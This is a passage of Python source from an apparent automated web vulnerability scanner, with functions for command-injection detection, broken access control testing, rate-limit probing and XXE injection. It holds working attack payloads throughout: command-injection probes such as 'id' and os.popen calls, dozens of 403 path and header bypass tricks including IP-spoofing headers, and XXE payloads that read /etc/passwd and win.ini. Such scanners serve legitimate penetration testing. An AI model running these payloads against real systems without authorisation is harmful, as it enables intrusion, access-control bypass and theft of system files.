                        "delay_seconds": round(elapsed, 2),
                        "evidence": f"Direct command: response delayed {elapsed:.2f}s vs baseline {baseline_time:.2f}s",
                        "os": "linux",
                        "url": test_url,
                    })
                    return result

            # Output-based Linux payloads
            baseline_has_linux = _RCE_OUTPUT_INDICATORS.search(baseline_body)
            for payload in _RCE_OUTPUT_PAYLOADS:
                test_url = _replace_param(target_url, param, original_value + payload)
                status, body, _ = await _send(session, test_url)

                if status == 0:
                    continue

                match = _RCE_OUTPUT_INDICATORS.search(body)
                if match and not baseline_has_linux:
                    # Verify this is genuine RCE, not LFI or reflection FP.
                    # Problem: "cat /etc/passwd" triggers on LFI endpoints,
                    # and "echo MARKER" appears on sites that reflect input
                    # in HTML (form action, links, etc.).
                    #
                    # Solution: Use expr math as confirmation — `expr 13371 + 13372`
                    # outputs "26743" which ONLY appears via command execution,
                    # never from URL reflection or LFI file reads.
                    sep_match = re.match(r"^(%[0-9a-fA-F]{2}|[;|&\n`]|&&|\|\||%00[;|]|\$\()", payload)
                    if not sep_match:
                        # Can't extract separator — skip (don't confirm without proof)
                        continue
                    sep = sep_match.group(0)
                    math_a, math_b = 13371, 13372
                    math_result = str(math_a + math_b)  # "26743"
                    if sep == "$(":
                        confirm_payload = f"$(expr {math_a} + {math_b})"
                    elif sep == "`":
                        confirm_payload = f"`expr {math_a} + {math_b}`"
                    else:
                        confirm_payload = f"{sep}expr {math_a} + {math_b}"
                    confirm_url = _replace_param(target_url, param, original_value + confirm_payload)
                    _, confirm_body, _ = await _send(session, confirm_url)
                    if math_result not in confirm_body:
                        # Math result absent — not RCE (likely LFI or reflection)
                        continue
                    # Also verify the math result is NOT just reflected in URL/form
                    # by checking it appears outside of URL-encoded contexts
                    confirm_url_str = confirm_url.replace("%2B", "+")
                    if confirm_body.count(math_result) <= confirm_body.count(confirm_url_str.split("?")[1] if "?" in confirm_url_str else ""):
                        continue
                    # Confirmed genuine RCE via math expression
                    start = max(0, match.start() - 50)
                    end = min(len(body), match.end() + 100)
                    evidence_ctx = body[start:end].strip()
                    result.update({
                        "vulnerable": True,
                        "technique": "output-based",
                        "payload": payload,
                        "evidence": f"RCE confirmed (expr {math_a}+{math_b}={math_result} computed): ...{evidence_ctx}...",
                        "os": "linux",
                        "url": test_url,
                    })
                    return result

            # Direct replacement — for params where the value IS the command
            # (e.g., ?cmd=id, ?code=eval_expr, ?exec=command)
            _RCE_DIRECT_PAYLOADS = [
                "id",
                "whoami",
                "__import__('os').popen('id').read()",
                "system('id')",
            ]
            for payload in _RCE_DIRECT_PAYLOADS:
                test_url = _replace_param(target_url, param, payload)
                status, body, _ = await _send(session, test_url)

                if status == 0:
                    continue

                match = _RCE_OUTPUT_INDICATORS.search(body)
                if match and not baseline_has_linux:
                    # Confirm with math expression (not echo — echo gets reflected)
                    math_a, math_b = 13371, 13372
                    math_result = str(math_a + math_b)
                    confirm_url = _replace_param(target_url, param, f"expr {math_a} + {math_b}")
                    _, confirm_body, _ = await _send(session, confirm_url)
                    if math_result in confirm_body:
                        start = max(0, match.start() - 50)
                        end = min(len(body), match.end() + 100)
                        evidence_ctx = body[start:end].strip()
                        result.update({
                            "vulnerable": True,
                            "technique": "direct-command",
                            "payload": payload,
                            "evidence": f"Direct command (confirmed expr {math_a}+{math_b}={math_result}): ...{evidence_ctx}...",
                            "os": "linux",
                            "url": test_url,
                        })
                        return result

            # Output-based Windows payloads
            baseline_has_win = _RCE_WINDOWS_INDICATORS.search(baseline_body)
            for payload in _RCE_OUTPUT_PAYLOADS_WINDOWS:
                test_url = _replace_param(target_url, param, original_value + payload)
                status, body, _ = await _send(session, test_url)

                if status == 0:
                    continue

                win_match = _RCE_WINDOWS_INDICATORS.search(body)
                if win_match and not baseline_has_win:
                    # Verify genuine RCE using math: set /a computes arithmetic
                    # on Windows. Result "26743" only appears via command execution.
                    sep_match = re.match(r"^(%[0-9a-fA-F]{2}|[;|&\n`]|&&|\|\||%00[;|]|\$\()", payload)
                    if not sep_match:
                        continue  # Can't confirm without separator
                    sep = sep_match.group(0)
                    math_a, math_b = 13371, 13372
                    math_result = str(math_a + math_b)
                    confirm_payload = f"{sep}set /a {math_a}+{math_b}"
                    confirm_url = _replace_param(target_url, param, original_value + confirm_payload)
                    _, confirm_body, _ = await _send(session, confirm_url)
                    if math_result not in confirm_body:
                        continue  # Not RCE
                    # Confirmed RCE via math
                    start = max(0, win_match.start() - 50)
                    end = min(len(body), win_match.end() + 100)
                    evidence_ctx = body[start:end].strip()
                    result.update({
                        "vulnerable": True,
                        "technique": "output-based",
                        "payload": payload,
                        "evidence": f"RCE confirmed (set /a {math_a}+{math_b}={math_result}): ...{evidence_ctx}...",
                        "os": "windows",
                        "url": test_url,
                    })
                    return result

    except Exception:
        pass

    return result


# ---------------------------------------------------------------------------
# Broken Access Control Testing
# ---------------------------------------------------------------------------

_ADMIN_PATH_PATTERNS = [
    "/admin", "/dashboard", "/manage", "/internal", "/debug", "/config",
    "/settings", "/api/admin", "/api/internal", "/api/debug", "/api/private",
    "/console", "/actuator", "/swagger", "/api-docs", "/graphiql",
    "/phpmyadmin", "/wp-admin", "/manager", "/panel",
]


_PATH_BYPASS_STRATEGIES = [
    # Case variations
    lambda p: p.replace("/admin", "/Admin"),
    lambda p: p.replace("/admin", "/ADMIN"),
    # URL encoding
    lambda p: p.replace("/admin", "/%61dmin"),
    lambda p: p.replace("/admin", "/admin%20"),
    lambda p: p.replace("/admin", "/admin%09"),
    # Path traversal
    lambda p: p.replace("/admin", "/./admin"),
    lambda p: p.replace("/admin", "//admin"),
    lambda p: p.replace("/admin", "/admin/"),
    lambda p: p.replace("/admin", "/admin/."),
    lambda p: p.replace("/admin", "/;/admin"),
    lambda p: p.replace("/admin", "/.;/admin"),
    lambda p: p.replace("/admin", "/admin;"),
    lambda p: p.replace("/admin", "/..;/admin"),
    # Double URL encoding
    lambda p: p.replace("/admin", "/%2e/admin"),
    lambda p: p.replace("/admin", "/admin%23"),
    # API bypass techniques from Web-Fuzzing-Box
    lambda p: p.replace("/admin", "/%2e%2e%2f/admin"),  # encoded ../
    lambda p: p.replace("/admin", "/admin%00"),          # null byte
    lambda p: p.replace("/admin", "/admin.json"),        # extension bypass
    lambda p: p.replace("/admin", "/admin%26"),           # & char bypass
    lambda p: p.replace("/admin", "/admin%3f"),           # ? char bypass
    lambda p: p.replace("/admin", "/css/../admin"),       # static path prefix bypass
    lambda p: p.replace("/admin", "/js/../admin"),        # static path prefix bypass
    lambda p: p.replace("/admin", "/admin;aaa.js"),       # fake extension bypass
    lambda p: p.replace("/admin", "/admin..%00/"),        # null in traversal
    lambda p: p.replace("/admin", "/admin%0d/"),          # CR bypass
    lambda p: p.replace("/admin", "/.%2e/admin"),         # mixed encoding traversal
    # --- nomore403: End-path bypasses ---
    lambda p: p.replace("/admin", "/admin?debug=true"),   # debug param bypass
    lambda p: p.replace("/admin", "/admin.svc"),          # WCF service extension
    lambda p: p.replace("/admin", "/admin.wsdl"),         # WSDL descriptor
    lambda p: p.replace("/admin", "/admin?WSDL"),         # WSDL query bypass
    lambda p: p.replace("/admin", "/admin%2500"),         # double-encoded null byte
    lambda p: p.replace("/admin", "/admin..;"),           # semicolon traversal suffix
    lambda p: p.replace("/admin", "/admin.css"),          # static file extension bypass
    lambda p: p.replace("/admin", "/admin.html"),         # HTML extension bypass
    lambda p: p.replace("/admin", "/admin/*"),            # wildcard bypass
    lambda p: p.replace("/admin", "/admin/..%3B/"),       # encoded semicolon traversal
    # --- nomore403: Mid-path bypasses (most creative/unique) ---
    lambda p: p.replace("/admin", "/%2f/admin"),          # encoded slash prefix
    lambda p: p.replace("/admin", "/%252f/admin"),        # double-encoded slash mid-path
    lambda p: p.replace("/admin", "/../;/admin"),         # traversal + semicolon combo
    lambda p: p.replace("/admin", "/..%252F/admin"),      # double-encoded traversal slash
    lambda p: p.replace("/admin", "/%3b/admin"),          # encoded semicolon prefix
    lambda p: p.replace("/admin", "/%3b%2f..%2f/admin"),  # encoded ;/../
    lambda p: p.replace("/admin", "/%2f%3b%2f/admin"),    # encoded /;/
    lambda p: p.replace("/admin", "/%2e%2e/admin"),       # fully encoded ../
    lambda p: p.replace("/admin", "/..%00/admin"),        # null byte in traversal
    lambda p: p.replace("/admin", "/..%0d/admin"),        # CR in traversal
    lambda p: p.replace("/admin", "/%252e%252e/admin"),   # double-encoded .. prefix
    lambda p: p.replace("/admin", "/%252f%252f/admin"),   # double-encoded // prefix
    lambda p: p.replace("/admin", "/..\\.\\admin"),       # backslash traversal (IIS/Windows)
]


async def test_broken_access(
    endpoints: list[str], auth_token: str | None = None,
) -> list[dict[str, Any]]:
    """Test broken access control via unauthenticated admin access, verb tampering, and path bypass."""
    findings: list[dict[str, Any]] = []

    try:
        async with aiohttp.ClientSession() as session:
            # Get baseline response size (homepage) to detect SPA catch-all
            baseline_size = 0
            try:
                base_url = endpoints[0].split("/")[0] + "//" + endpoints[0].split("/")[2]
                _, base_body, _ = await _send(session, base_url)
                baseline_size = len(base_body)
            except Exception:
                pass

            # Strategy 1: Unauthenticated admin access
            admin_endpoints = [
                ep for ep in endpoints
                if any(pattern in ep for pattern in _ADMIN_PATH_PATTERNS)
            ]

            for endpoint in admin_endpoints:
                status, body, _ = await _send(session, endpoint)
                # Skip if response matches SPA catch-all (same size as homepage)
                if baseline_size and abs(len(body) - baseline_size) < 50:
                    continue
                # Skip SPA-like responses that are HTML shells (no real data)
                if ('<div id="root">' in body or '<div id="app">' in body
                        or '<div id="__next">' in body or '<div id="__nuxt">' in body):
                    if len(body) < 5000:
                        continue
                # Must be 200 with meaningful content, and look like data (JSON/HTML with data)
                if status == 200 and len(body) > 100:
                    findings.append({
                        "endpoint": endpoint,
                        "accessible": True,
                        "status_code": status,
                        "content_length": len(body),
                        "technique": "unauthenticated_admin_access",
                        "evidence": f"Admin endpoint returned 200 with {len(body)} bytes (no auth)",
                    })

            # Strategy 2: Verb tampering on 403 endpoints
            for endpoint in endpoints:
                get_status, _, _ = await _send(session, endpoint)

                if get_status not in (401, 403):
                    continue

                for method in ("POST", "PUT", "DELETE", "PATCH", "OPTIONS"):
                    status, body, _ = await _send(session, endpoint, method=method)

                    if status == 200:
                        findings.append({
                            "endpoint": endpoint,
                            "accessible": True,
                            "status_code": status,
                            "content_length": len(body),
                            "technique": "verb_tampering",
                            "evidence": f"GET returned {get_status}, {method} returned 200",
                        })
                        break

                # Strategy 2b: X-HTTP-Method-Override
                if get_status in (401, 403):
                    for override_method in ("PUT", "DELETE", "PATCH"):
                        status, body, _ = await _send(
                            session, endpoint,
                            headers={"X-HTTP-Method-Override": override_method},
                        )
                        if status == 200:
                            findings.append({
                                "endpoint": endpoint,
                                "accessible": True,
                                "status_code": status,
                                "content_length": len(body),
                                "technique": "method_override",
                                "evidence": f"X-HTTP-Method-Override: {override_method} bypassed {get_status}",
                            })
                            break

            # Strategy 3: Header-based 403 bypass (byp4xx-style + nomore403)
            # Static IP-spoofing headers (same for every endpoint)
            _BYPASS_HEADERS_STATIC = [
                {"X-Custom-IP-Authorization": "127.0.0.1"},
                # --- IP-spoofing headers ---
                {"X-Forwarded-For": "127.0.0.1"},
                {"X-Real-IP": "127.0.0.1"},
                {"X-Originating-IP": "127.0.0.1"},
                {"X-Remote-IP": "127.0.0.1"},
                {"X-Remote-Addr": "127.0.0.1"},
                {"X-ProxyUser-Ip": "127.0.0.1"},
                {"X-Client-IP": "127.0.0.1"},
                {"X-Host": "127.0.0.1"},
                {"X-Forwarded-Host": "localhost"},
                # --- nomore403: Cloudflare / proxy IP headers ---
                {"CF-Connecting-IP": "127.0.0.1"},
                {"CF-Connecting_IP": "127.0.0.1"},
                {"True-Client-IP": "127.0.0.1"},
                {"Cluster-Client-IP": "127.0.0.1"},
                {"Client-IP": "127.0.0.1"},
                {"X-Original-Remote-Addr": "127.0.0.1"},
                {"X-True-IP": "127.0.0.1"},
                {"Real-Ip": "127.0.0.1"},
                # --- nomore403: Forwarding chain headers ---
                {"Forwarded": "for=127.0.0.1"},
                {"Forwarded-For": "127.0.0.1"},
                {"X-Forward-For": "127.0.0.1"},
                {"X-Forwarded-By": "127.0.0.1"},
                {"X-Forwarded-For-Original": "127.0.0.1"},
                {"X-Forwarder-For": "127.0.0.1"},
                {"X-Originally-Forwarded-For": "127.0.0.1"},
                {"X-Forwarded-Server": "127.0.0.1"},
                # --- nomore403: Misc static headers ---
                {"X-HTTP-Host-Override": "localhost"},
                {"Proxy-Host": "127.0.0.1"},
                {"Proxy": "127.0.0.1"},
                {"X-Forwarded-Proto": "https"},
                {"X-WAP-Profile": "http://127.0.0.1/wap.xml"},
                {"X-Arbitrary": "127.0.0.1"},
                {"Origin": "http://127.0.0.1"},
            ]
            for endpoint in endpoints:
                get_status, _, _ = await _send(session, endpoint)
                if get_status not in (401, 403):
                    continue

                # Build dynamic path-override headers per endpoint
                _ep_path = urlparse(endpoint).path or "/"
                _bypass_headers = _BYPASS_HEADERS_STATIC + [
                    {"X-Original-URL": _ep_path},
                    {"X-Rewrite-URL": _ep_path},
                    {"Referer": _ep_path},
                    {"Destination": _ep_path},
                    {"Request-Uri": _ep_path},
                    {"X-HTTP-DestinationURL": _ep_path},
                    {"X-Proxy-Url": _ep_path},
                    {"Proxy-Url": _ep_path},
                    {"Redirect": _ep_path},
                    {"Base-Url": _ep_path},
                    {"Http-Url": _ep_path},
                    {"Profile": _ep_path},
                    {"Uri": _ep_path},
                    {"Url": _ep_path},
                ]

                for bypass_hdr in _bypass_headers:
                    status, body, _ = await _send(
                        session, endpoint, headers=bypass_hdr,
                    )
                    if status == 200 and len(body) > 100:
                        hdr_name = list(bypass_hdr.keys())[0]
                        hdr_val = list(bypass_hdr.values())[0]
                        findings.append({
                            "endpoint": endpoint,
                            "accessible": True,
                            "status_code": status,
                            "content_length": len(body),
                            "technique": "header_bypass",
                            "evidence": f"GET returned {get_status}, adding {hdr_name}: {hdr_val} returned 200",
                        })
                        break

            # Strategy 4: Path traversal bypass on 403 admin endpoints
            for endpoint in endpoints:
                if "/admin" not in endpoint.lower():
                    continue

                base_status, _, _ = await _send(session, endpoint)
                if base_status not in (401, 403):
                    continue

                for bypass_fn in _PATH_BYPASS_STRATEGIES:
                    try:
                        bypass_url = bypass_fn(endpoint)
                    except Exception:
                        continue

                    if bypass_url == endpoint:
                        continue

                    status, body, _ = await _send(session, bypass_url)
                    if status == 200 and len(body) > 100:
                        findings.append({
                            "endpoint": bypass_url,
                            "accessible": True,
                            "status_code": status,
                            "content_length": len(body),
                            "technique": "path_traversal_bypass",
                            "evidence": f"Original {endpoint} returned {base_status}, bypass URL returned 200",
                            "original_endpoint": endpoint,
                        })
                        break

    except Exception:
        pass

    return findings


# ---------------------------------------------------------------------------
# Rate Limit Testing
# ---------------------------------------------------------------------------


async def test_rate_limit(
    auth_endpoint: str, method: str = "POST",
) -> dict[str, Any]:
    """Send 30 rapid requests to detect missing rate limiting."""
    status_counts: dict[int, int] = {}
    requests_before_block = 0
    rate_limited = False
    lockout_detected = False

    try:
        async with aiohttp.ClientSession() as session:
            for i in range(1, 31):
                status, body, _ = await _send(session, auth_endpoint, method=method)

                status_counts[status] = status_counts.get(status, 0) + 1

                if status == 429 and not rate_limited:
                    rate_limited = True
                    requests_before_block = i

                # Lockout: account locked indicators in body
                if re.search(r"account.*locked|too many.*attempt|locked out|temporarily.*disabled", body, re.I):
                    lockout_detected = True

    except Exception:
        pass

    if rate_limited:
        evidence = f"HTTP 429 received after {requests_before_block} requests"
    else:
        evidence = f"No rate limiting detected after 30 requests (status distribution: {status_counts})"

    return {
        "endpoint": auth_endpoint,
        "rate_limited": rate_limited,
        "requests_before_block": requests_before_block,
        "lockout_detected": lockout_detected,
        "evidence": evidence,
    }


# ---------------------------------------------------------------------------
# XXE (XML External Entity) Testing
# ---------------------------------------------------------------------------

_XXE_PAYLOADS: list[tuple[str, str, str]] = [
    # (payload, technique_name, os_target)
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<root>&xxe;</root>',
        "file-read",
        "linux",
    ),
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
        '<root>&xxe;</root>',
        "file-read",
        "windows",
    ),
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>'
        '<root>test</root>',
        "parameter-entity",
        "linux",
    ),
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
        '<soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
        "soap-xxe",
        "linux",
    ),
    (
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
        '<xi:include parse="text" href="file:///etc/passwd"/></foo>',
        "xinclude",
        "linux",
    ),
]

_XXE_LINUX_INDICATORS = re.compile(r"root:|bin/bash|bin/sh|sbin/nologin")
_XXE_WINDOWS_INDICATORS = re.compile(r"\[extensions\]|\[fonts\]|for 16-bit")
_XXE_ERROR_INDICATORS = re.compile(
    r"entity|DTD|DOCTYPE|SAXParseException|XMLSyntaxError|lxml\.etree",
    re.I,
)


async def test_xxe(
    target_url: str, param: str = "", original_value: str = "",
) -> dict[str, Any]:
    """Test for XML External Entity injection via XML/SOAP POST payloads."""
    content_types = ["application/xml", "text/xml"]

    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession() as session:
            for xml_payload, technique, os_target in _XXE_PAYLOADS:
                for ct in content_types:
                    headers = {
                        **_HEADERS,
                        **_AUTH_HEADERS,
                        "Content-Type": ct,
                    }
                    try:
                        async with session.post(
                            target_url,
                            data=xml_payload,
                            headers=headers,
                            ssl=False,
                            timeout=timeout,
                        ) as resp:
                            body = await resp.text(errors="replace")
                            body = body[:50_000]
                            resp_headers = {k.lower(): v for k, v in resp.headers.items()}

                            # Check for Linux file read indicators
                            if os_target == "linux":
                                match = _XXE_LINUX_INDICATORS.search(body)
                                if match:
                                    return {
                                        "vulnerable": True,
                                        "url": target_url,
                                        "payload": xml_payload,
                                        "evidence": f"XXE file read: {body[max(0, match.start() - 20):match.end() + 80].strip()}",
                                        "technique": technique,
                                        "confidence": "high",
                                    }

                            # Check for Windows file read indicators
                            if os_target == "windows":
                                match = _XXE_WINDOWS_INDICATORS.search(body)
                                if match:
                                    return {
                                        "vulnerable": True,
                                        "url": target_url,
                                        "payload": xml_payload,
                                        "evidence": f"XXE file read (Windows): {body[max(0, match.start() - 20):match.end() + 80].strip()}",
                                        "technique": technique,
                                        "confidence": "high",
                                    }

                            # Error-based XXE detection removed — too noisy.
                            # Servers commonly echo "DOCTYPE"/"entity" in error
                            # messages without actually processing entities.
                            # Only file-read confirmation (above) is reliable.

                    except Exception:
                        continue

    except Exception as exc:
        logger.debug("xxe_test_error", url=target_url, error=str(exc))

    return {"vulnerable": False, "url": target_url}
